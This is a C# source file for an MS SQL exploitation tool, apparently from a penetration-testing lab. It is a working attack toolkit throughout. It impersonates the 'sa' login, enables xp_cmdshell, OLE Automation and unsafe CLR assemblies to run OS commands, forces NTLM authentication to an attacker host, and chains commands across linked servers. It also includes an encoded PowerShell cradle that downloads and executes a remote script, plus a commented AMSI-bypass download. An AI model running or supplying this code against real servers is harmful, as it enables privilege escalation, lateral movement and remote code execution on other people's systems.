using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        /* MS SQL Exploitation Utility
         *
         * This can do multiple things:
         * print access
         * display linked servers
         * code execution
         * code execution on linked servers
         * double-linked server stuff
         */

        static void queryAccess(SqlConnection con)
        {
            // Query current SQL login
            String querylogin = "SELECT SYSTEM_USER";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            // Map user
            String queryuser = "SELECT USER_NAME()";
            command = new SqlCommand(queryuser, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Mapped to user: " + reader[0]);
            reader.Close();

            // Query public role
            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("User is a member of public role");
            }
            else
            {
                Console.WriteLine("User is NOT a member of public role");
            }
            reader.Close();


            // Query sysadmin role
            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(querysysadminrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("User is a member of sysadmin role");
            }
            else
            {
                Console.WriteLine("User is NOT a member of sysadmin role");
            }
            reader.Close();

        }

        static void forceAuth(SqlConnection con, String server)
        {
            // Forced Authentication
            String query = "EXEC master..xp_dirtree \"\\\\" + server + "\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
        }

        static void findImpersonatableUsers(SqlConnection con)
        {
            // Listimpersonate users
            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read() == true)
            {
                Console.WriteLine("Logins that can be impersonated: " + reader[0]);
            }
            reader.Close();
        }

        static void findLinkedServerImpersonatableUsers(SqlConnection con, String linkedServer)
        {
            // Listimpersonate users on linked server
            String query = "select users from openquery(\"" + linkedServer + "\", 'SELECT distinct b.name AS users FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE''');";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read() == true)
            {
                Console.WriteLine("Login " + reader[0] + " can be impersonated on " + linkedServer);
            }
            reader.Close();
        }

        static void executeAsLogin(SqlConnection con, String login)
        {
            // e.g. login = sa
            Console.WriteLine("Executing AS LOGIN");
            String executeaslogin = "EXECUTE AS LOGIN = '" + login + "';";
            SqlCommand command = new SqlCommand(executeaslogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
            Console.WriteLine("After EXECUTE AS LOGIN");
        }

        static void executeAsUser(SqlConnection con, String user)
        {
            // e.g. user = dbo
            Console.WriteLine("Executing AS USER");
            String executeasuser = "use msdb; EXECUTE AS USER = '" + user + "';";
            SqlCommand command = new SqlCommand(executeasuser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
            Console.WriteLine("After EXECUTE AS USER");
        }

        static void execute_xp_cmdshell(SqlConnection con, String cmd)
        {
            executeAsLogin(con, "sa");

            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
            SqlCommand command = new SqlCommand(enable_xpcmd, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            String execCmd = "EXEC xp_cmdshell " + cmd;
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Result of command is: " + reader[0]);
            reader.Close();
        }

        static void execute_sp_oacreate(SqlConnection con, String cmd)
        {
            // e.g. cmd = "cmd /c \"echo Test > C:\\Tools\\file.txt\""
            executeAsLogin(con, "sa");

            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
            SqlCommand command = new SqlCommand(enable_ole, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '" + cmd + "';";
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Close();
        }

        static void enumerateLinkedServers(SqlConnection con)
        {
            String execCmd = "EXEC sp_linkedservers;";
            SqlCommand command = new SqlCommand(execCmd, con);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine("Linked SQL server: " + reader[0]);
            }
            reader.Close();
        }

        static void queryLinkedServerAccess(SqlConnection con, String linkedServer)
        {
            String queryLinkedLogin = "select myuser from openquery(\"" + linkedServer + "\", 'select SYSTEM_USER as myuser');";
            SqlCommand command = new SqlCommand(queryLinkedLogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing as the login " + reader[0] + " on " + linkedServer);
            reader.Close();

            String queryLinkedUser = "select myusername from openquery(\"" + linkedServer + "\", 'SELECT USER_NAME() as myusername');";
            command = new SqlCommand(queryLinkedUser, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Mapped to user: " + reader[0]);
            reader.Close();

            // Query public role
            String queryLinkedPublicRole = "select ismember from openquery(\"" + linkedServer + "\", 'SELECT IS_SRVROLEMEMBER(''public'') as ismember');";
            command = new SqlCommand(queryLinkedPublicRole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("User is a member of public role" + " on " + linkedServer);
            }
            else
            {
                Console.WriteLine("User is NOT a member of public role" + " on " + linkedServer);
            }
            reader.Close();

            // Query sysadmin role
            String queryLinkedSysadminRole = "select ismember from openquery(\"" + linkedServer + "\", 'SELECT IS_SRVROLEMEMBER(''sysadmin'') as ismember');";
            command = new SqlCommand(queryLinkedSysadminRole, con);
            reader = command.ExecuteReader();
            reader.Read();
            role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("User is a member of sysadmin role" + " on " + linkedServer);
            }
            else
            {
                Console.WriteLine("User is NOT a member of sysadmin role" + " on " + linkedServer);
            }
            reader.Close();
        }

        static void executeDLL(SqlConnection con, String cmd)
        {
            executeAsLogin(con, "sa");

            String configureDB = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security',0; RECONFIGURE;";
            SqlCommand command = new SqlCommand(configureDB, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            string dropproc = "drop procedure IF EXISTS cmdexec;";
            command = new SqlCommand(dropproc, con);
            reader = command.ExecuteReader();
            reader.Close();

            string dropassem = "drop assembly IF EXISTS myassembly;";
            command = new SqlCommand(dropassem, con);
            reader = command.ExecuteReader();
            reader.Close();

            // String createAssem = "CREATE ASSEMBLY myAssembly FROM 'C:\Path\To\sqllibrary.dll' WITH PERMISSION_SET = UNSAFE;";
            // TODO: create the FROM 0x1234 with the following PowerShell
            // $assemblyFile = "C:\Path\To\sqllibrary.dll"
            // $stringBuilder = New-Object -Type System.Text.StringBuilder
            // $fileStream = [IO.File]::OpenRead($assemblyFile)
            // while (($byte = $fileStream.ReadByte()) -gt -1) {
            //     $stringBuilder.Append($byte.ToString("X2")) | Out-Null
            //     }
            //     $stringBuilder.ToString() -join "" | Out-File c:\Tools\cmdExec.txt
            // }
            String createAssem = "CREATE ASSEMBLY myAssembly FROM 0x1234 WITH PERMISSION_SET = UNSAFE;";
            command = new SqlCommand(createAssem, con);
            reader = command.ExecuteReader();
            reader.Close();

            String createProc = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
            command = new SqlCommand(createProc, con);
            reader = command.ExecuteReader();
            reader.Close();

            String execCmd = "EXEC cmdExec '" + cmd + "';";
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Result of command is: " + reader[0]);
            reader.Close();
        }

        static void enableRPCOut(SqlConnection con)
        {
            //SqlCommand command = new SqlCommand("EXEC sp_serveroption 'LOCALHOST\\instance', 'rpc_out',1; reconfigure;", con);
            SqlCommand command = new SqlCommand("EXEC sp_serveroption @server='target', @optname='rpc out', @optvalue='TRUE'; reconfigure;", con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
        }
        static void executeRemote_xp_cmdshell(SqlConnection con, String remote, String cmd)
        {
            // e.g. cmd = powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQ

            SqlCommand command = new SqlCommand("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT " + remote, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand("EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT " + remote, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand("EXEC ('xp_cmdshell ''" + cmd + "'';') AT " + remote, con);
            reader = command.ExecuteReader();
            reader.Close();
        }

        static void listDoubleLinkedServers(SqlConnection con, String remote)
        {
            SqlCommand command = new SqlCommand("EXEC ('sp_linkedservers') AT " + remote, con);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine("Linked SQL server: " + reader[0]);
            }
            reader.Close();
        }

        static void listDoubleLinkedUser(SqlConnection con, String remote, String local)
        {
            SqlCommand command = new SqlCommand("select mylogin from openquery(\"" + remote + "\", 'select mylogin from openquery(\"" + local + "\", ''select SYSTEM_USER as mylogin'')')", con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("SYSTEM_USER: " + reader[0]);
            reader.Close();
        }

        static void doubleLinkedPowerShellDownloadCradle(SqlConnection con, String remote, String local)
        {
            String configureAdvancedOptionsQuery = "EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT " + local + "') AT " + remote;

            String enableXPCmdShellQuery = "EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT " + local + "') AT " + remote;

            String xpCmdShellQuery = "EXEC ('EXEC (''xp_cmdshell ''''powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEAMQA1AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA'''';'') AT " + local + "') AT " + remote;


            SqlCommand command = new SqlCommand(configureAdvancedOptionsQuery, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enableXPCmdShellQuery, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(xpCmdShellQuery, con);
            reader = command.ExecuteReader();
            reader.Close();
        }

        static void enumerateLinkedServerUsers(SqlConnection con)
        {
            // Query current SQL login
            String linkedUsersQuery = "EXEC sp_helplinkedsrvlogin";
            SqlCommand command = new SqlCommand(linkedUsersQuery, con);
            SqlDataReader reader = command.ExecuteReader();
            Console.WriteLine("Output: | LinkedServer | LocalLogin | IsSelfMapping | RemoteLogin |");
            while (reader.Read())
            {
                Console.WriteLine("Output: |" + reader[0] + " | " + reader[1] + " | " + reader[2] + " | " + reader[3] + " |");
            }
            reader.Close();
        }

        static void runQuery(SqlConnection con, String query)
        {
            // Query current SQL login
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine("Output: " + reader[0]);
            }
            reader.Close();
        }

        static void Main(string[] args)
        {

            if (args.Length < 1)
            {
                Console.WriteLine("Which Host???");
                return;
            }
            String sqlServer = args[0];

            //String sqlServer = "web06.dev.final.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open();
                Console.WriteLine("Auth Success");
            }
            catch
            {
                Console.WriteLine("Auth Failed");
                Environment.Exit(0);
            }

            //runQuery(con, "SELECT remote_name FROM sys.linked_logins");
            //queryAccess(con);
            //forceAuth(con, "1.2.3.4");
            //findImpersonatableUsers(con);
            //executeAsLogin(con, "sa");
            //executeAsUser(con, "dbo");
            //execute_xp_cmdshell(con, "whoami");
            //execute_sp_oacreate(con, "cmd /c \"echo Test > C:\\Tools\\file.txt\"");
            //execute_sp_oacreate(con, "whoami");
            //executeDLL(con, "whoami");
            //enumerateLinkedServers(con);
            //enumerateLinkedServerUsers(con);
            //queryLinkedServerAccess(con, "target");
            //findLinkedServerImpersonatableUsers(con, "target");
            //enableRPCOut(con);
            // TODO: pass encoded powershell - e.g. 'whoami'
            //  (New-Object System.Net.WebClient).DownloadString('http://1.2.3.4/amsibypass.txt') | IEX; (New-Object System.Net.WebClient).DownloadString('http://1.2.3.4/run.txt') | IEX
            //executeRemote_xp_cmdshell(con, "target", "powershell -enc d2hvYW1pCg==");
            //listDoubleLinkedServers(con, "target");
            //listDoubleLinkedUser(con, "target", "linkedtarget");
            //doubleLinkedPowerShellDownloadCradle(con, "target", "linkedtarget");





            con.Close();

        }
    }
}
